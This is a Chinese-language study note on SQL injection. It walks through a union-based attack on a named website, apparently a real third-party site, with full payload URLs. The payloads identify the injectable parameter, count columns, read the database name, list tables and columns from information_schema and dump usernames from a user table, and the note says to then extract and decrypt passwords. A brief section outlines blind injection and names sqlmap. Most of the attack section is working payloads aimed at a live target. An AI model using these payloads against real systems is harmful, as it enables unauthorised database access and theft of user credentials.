注入过程:http://www.hdyc.cn/newslist.php?cd=2’

#### 1.判断是否是字符类型还是整型:

末尾加上 ' ,如果失败说明是整型，否则是字符型。

### 2.判断是否有注入点:http://www.hdyc.cn/newslist.php?cd=2 and 1=1

如果成功查询，说明有注入点。

### 3.查询出有多少列（通过order by后面加数字，如果出现错误则为最大长度）

http://www.hdyc.cn/newslist.php?cd=2 order by 6

### 4.知道了列数，那么就可以进行**UNION**合并(必须列数相同)，查出显位(即哪一列的数据显示在页面上)

http://www.hdyc.cn/newslist.php?cd=2 and 1= 2 union select 1,2,3,4,5,6

语义:and 1=2 直接否定了前面所有条件，后面合并 select 1,2,3,4,5,6（因为我们知道了有6列）

这就相当于，一张空表然后加上 1,2,3,4,5,6 ,最后显示到页面上有哪些数字，说明有哪些列是直接显示的。

显位: 2 （所以后面查询的数据都只能显示到2列位上）

![image-20200210155828145](C:\Users\12714\AppData\Roaming\Typora\typora-user-images\image-20200210155828145.png)

### 5.查出当前库名: database（）函数显示当前库名

http://www.hdyc.cn/newslist.php?cd=2 and 1= 2 union select 1,database(),3,4,5,6

![image-20200210160701224](C:\Users\12714\AppData\Roaming\Typora\typora-user-images\image-20200210160701224.png)

### 5.查出第一张表:

在数据库中存在某个information_schema库，当中存了表的集合，列的集合等.....

information_schema.tables表

table_schema ：库名

table_name : 表名

information_schema.columns 表

column_name ： 列名

http://www.hdyc.cn/newslist.php?cd=2 and 1=2 union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database() limit 1,1

### 6.查出所有表名:使用group_concat(列名)，查出所有该列数值

http://www.hdyc.cn/newslist.php?cd=2 and 1=2 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema='database()

### 7.查出某个表(ql_user）之前已经查出)中所有字段：

http://www.hdyc.cn/newslist.php?cd=2 and 1=2 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_schema='db_hdyc_cn_1' and table_name='ql_user'

得到属性**userid,username**。

![image-20200210153745664](C:\Users\12714\AppData\Roaming\Typora\typora-user-images\image-20200210153745664.png)

查询出用户名和密码

http://www.hdyc.cn/newslist.php?cd=2 and 1=2 union select 1,group_concat(username),3,4,5,6 from ql_user

![image-20200210154604195](C:\Users\12714\AppData\Roaming\Typora\typora-user-images\image-20200210154604195.png)



然后根据用户名查询出相应的密码。然后进行解密即可。



**查询中也经常使用就是order by num这种方式，它的使用就是省略了字段名称直接使用num数字来代替相应位置的字段名称**(用于查询不知道列名时)

2.

**UNION**和**UNION ALL**（要求：两次查询的列数必须一致）

**UNION**：合并两个select结果集，去重复。（由于需要进行排序去重，所以效率低下）

**UNION ALL**：合并两个select结果集，不去重。(如果是两个必然不会重复的结果集建议使用)



### 总结：总的来说就是1.判断是字符还是整型2.进行and 1=1判断是否有注入点.3.有了注入点就可以进行注入，使用order by查询总列数。4.根据列数查看显位。5.在显位上显示当前库名6.根据information_schema.tables表查询当前库的所有表(因为该表中存放了所有库的表)7.查询需要表的所有列名，需要使用到表名information_schema.columns。8.然后就可以用户名，密码查出来了。

## 二、sql盲注

因为是盲注，所以数据库不会反回任何提示信息。所以显位，orderby是没用的。

所以所有消息只能靠猜，像database()都显示不了。

1.猜数据库名

虽然不能显示但是可以一个个猜，首先猜长度 and length(database()) = 4,一个个试就可以猜出来了。

然后通过分割字符窜一个个比较字符，猜出数据库名。

2.猜列名，表名

原理一样，知道了库名，使用information_schema表可以跟上面一样通过分解字符串一个个猜。得到表名和列名

### 所以一般情况都要使用工具 sqlmap ，椰树等....